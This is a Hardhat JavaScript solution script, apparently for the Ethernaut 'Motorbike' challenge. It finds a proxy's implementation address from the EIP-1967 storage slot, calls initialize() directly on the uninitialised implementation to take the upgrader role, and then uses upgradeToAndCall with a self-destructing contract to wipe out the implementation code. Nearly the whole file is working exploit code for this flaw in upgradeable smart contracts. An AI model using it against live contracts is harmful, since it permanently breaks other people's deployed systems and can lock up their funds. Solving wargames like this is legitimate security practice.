const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    // Get contracts
    const Engine = await ethers.getContractFactory("Engine");
    const SelfDestructEngine = await ethers.getContractFactory("SelfDestructEngine");

    // Deploy the SelfDestructEngine contract
    const selfDestructEngine = await SelfDestructEngine.deploy();
    await selfDestructEngine.deployed();
    console.log(`SelfDestructEngine deployed at ${selfDestructEngine.address}`);

    const engine = Engine.attach(instance_address);

    console.log(`Engine upgrader: ${await engine.upgrader()}`);
    console.log(`Engine horsePower: ${await engine.horsePower()}`);

    // Get the implementation address
    const storageSlot = ethers.BigNumber.from('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
    let implementation_address = await ethers.provider.getStorageAt(instance_address, storageSlot);
    implementation_address = '0x' + implementation_address.substring(26);
    console.log(`Implementation Address: ${implementation_address}`);

    const engine_implementation = Engine.attach(implementation_address);

    // Call initialize directly on the implementation contract
    let tx = await engine_implementation.initialize();
    await tx.wait(5);

    console.log(`Engine upgrader: ${await engine.upgrader()}`);
    console.log(`Engine horsePower: ${await engine.horsePower()}`);
    console.log(`Engine Implemenation upgrader: ${await engine_implementation.upgrader()}`);
    console.log(`Engine Implemenation horsePower: ${await engine_implementation.horsePower()}`);

    // We can call upgradeToAndCall now
    console.log("Self Destructing...")
    let ABI = ["function breakEngine()"];
    let iface = new ethers.utils.Interface(ABI);
    let cd = iface.encodeFunctionData("breakEngine");
    tx = await engine_implementation.upgradeToAndCall(selfDestructEngine.address, cd);
    await tx.wait(5);
    
    // Get code
    if (await ethers.provider.getCode(implementation_address) == "0x") {
        console.log("Success!");
    } else {
        console.log("Something went wrong!");
    }

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x0d6E52431C10EDd3B432A2549BEcFd45223426a5';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
